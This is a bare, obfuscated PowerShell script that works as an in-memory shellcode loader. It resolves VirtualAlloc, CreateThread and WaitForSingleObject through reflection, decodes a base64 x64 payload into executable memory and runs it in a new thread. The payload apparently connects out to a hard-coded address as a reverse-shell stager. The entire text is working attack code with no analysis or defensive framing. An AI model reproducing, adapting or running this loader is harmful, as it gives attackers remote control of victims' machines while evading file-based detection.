function sZA1 {
	Param ($gh, $zy)		
	$cC2k = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $cC2k.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cC2k.GetMethod('GetModuleHandle')).Invoke($null, @($gh)))), $zy))
}

function q_Wkj {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $mXPyO,
		[Parameter(Position = 1)] [Type] $ebH = [Void]
	)
	
	$gc = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$gc.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mXPyO).SetImplementationFlags('Runtime, Managed')
	$gc.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ebH, $mXPyO).SetImplementationFlags('Runtime, Managed')
	
	return $gc.CreateType()
}

[Byte[]]$w1Ju = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcQEUr7UFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$ql8 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sZA1 kernel32.dll VirtualAlloc), (q_Wkj @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $w1Ju.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($w1Ju, 0, $ql8, $w1Ju.length)

$eGXc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sZA1 kernel32.dll CreateThread), (q_Wkj @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ql8,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sZA1 kernel32.dll WaitForSingleObject), (q_Wkj @([IntPtr], [Int32]))).Invoke($eGXc,0xffffffff) | Out-Null
